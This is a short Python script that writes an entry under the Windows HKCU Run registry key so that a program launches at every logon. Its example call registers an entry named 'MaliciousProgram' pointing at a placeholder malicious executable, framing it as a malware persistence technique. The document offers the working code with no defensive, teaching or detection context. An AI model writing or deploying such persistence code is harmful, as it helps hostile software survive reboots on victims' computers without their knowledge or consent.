import winreg

def add_registry_run_key(name, value):
    key = winreg.HKEY_CURRENT_USER
    sub_key = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as registry_key:
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)

# Example usage
add_registry_run_key("MaliciousProgram", r"C:\\path\\to\\your\\malicious\\program.exe")